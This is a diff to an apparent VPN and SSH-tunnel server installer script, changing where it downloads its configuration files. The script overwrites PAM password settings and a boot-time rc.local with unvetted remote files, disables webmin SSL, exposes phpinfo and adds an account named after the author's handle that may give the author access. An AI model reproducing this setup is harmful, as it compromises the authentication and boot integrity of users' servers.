@@ -82,7 +82,7 @@ echo -e "${green}INSTALLER PROCESS PLEASE WAIT"
 echo -e "${black}TAKE TIME 5-10 MINUTE"
 "
 # script
-wget -O /etc/pam.d/common-password "http://rzvpn.net/random/common-password"
+wget -O /etc/pam.d/common-password "https://raw.githubusercontent.com/sslmode/my.mod/master/common-password"
 chmod +x /etc/pam.d/common-password
 # fail2ban & exim & protection
 apt-get -y install fail2ban sysv-rc-conf dnsutils dsniff zip unzip;
@@ -95,7 +95,7 @@ sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
 sed -i 's/#Banner/Banner/g' /etc/ssh/sshd_config
 # dropbear
 apt-get -y install dropbear
-wget -O /etc/default/dropbear "http://rzvpn.net/random/dropbear"
+wget -O /etc/default/dropbear "https://raw.githubusercontent.com/sslmode/my.mod/master/dropbear"
 sed -i 's/DROPBEAR_BANNER=""/DROPBEAR_BANNER="\/etc\/issue.net"/g' /etc/default/dropbear
 echo "/bin/false" >> /etc/shells
 echo "/usr/sbin/nologin" >> /etc/shells
@@ -113,31 +113,31 @@ ln /usr/local/sbin/dropbear /usr/sbin/dropbear
 service dropbear restartgi
 # squid3
 apt-get -y install squid3
-wget -O /etc/squid3/squid.conf "http://rzvpn.net/random/squid.conf"
-wget -O /etc/squid/squid.conf "http://rzvpn.net/random/squid.conf"
+wget -O /etc/squid3/squid.conf "https://raw.githubusercontent.com/sslmode/my.mod/master/squid.conf"
+wget -O /etc/squid/squid.conf "https://raw.githubusercontent.com/sslmode/my.mod/master/squid.conf"
 sed -i "s/ipserver/$myip/g" /etc/squid3/squid.conf
 sed -i "s/ipserver/$myip/g" /etc/squid/squid.conf
 # openvpn
 apt-get -y install openvpn
-wget -O /etc/openvpn/openvpn.tar "http://rzvpn.net/random/openvpn.tar"
+wget -O /etc/openvpn/openvpn.tar "https://raw.githubusercontent.com/sslmode/my.mod/master/openvpn.tar"
 cd /etc/openvpn/;tar xf openvpn.tar;rm openvpn.tar
-wget -O /etc/rc.local "http://rzvpn.net/random/rc.local";chmod +x /etc/rc.local
-#wget -O /etc/iptables.up.rules "http://rzvpn.net/random/iptables.up.rules"
+wget -O /etc/rc.local "https://raw.githubusercontent.com/sslmode/my.mod/master/rc.local";chmod +x /etc/rc.local
+#wget -O /etc/iptables.up.rules "https://raw.githubusercontent.com/sslmode/my.mod/master/iptables.up.rules"
 #sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
 #iptables-restore < /etc/iptables.up.rules
 # nginx
 apt-get -y install nginx php-fpm php-mcrypt php-cli libexpat1-dev libxml-parser-perl
 rm /etc/nginx/sites-enabled/default
 rm /etc/nginx/sites-available/default
-wget -O /etc/php/7.0/fpm/pool.d/www.conf "http://rzvpn.net/random/www.conf"
+wget -O /etc/php/7.0/fpm/pool.d/www.conf "https://raw.githubusercontent.com/sslmode/my.mod/master/www.conf"
 mkdir -p /home/vps/public_html
 echo "<pre>Setup by meow | telegram @nswircz | whatsapp +60183902905</pre>" > /home/vps/public_html/index.php
 echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
-wget -O /etc/nginx/conf.d/vps.conf "http://rzvpn.net/random/vps.conf"
+wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/sslmode/my.mod/master/vps.conf"
 sed -i 's/listen = \/var\/run\/php7.0-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php/7.0/fpm/pool.d/www.conf
 # etc
-wget -O /home/vps/public_html/client.ovpn "http://rzvpn.net/random/client.ovpn"
-wget -O /etc/motd "http://rzvpn.net/random/motd"
+wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/sslmode/my.mod/master/client.ovpn"
+wget -O /etc/motd "https://raw.githubusercontent.com/sslmode/my.mod/master/motd"
 sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
 sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
 useradd -m -g users -s /bin/bash nswircz
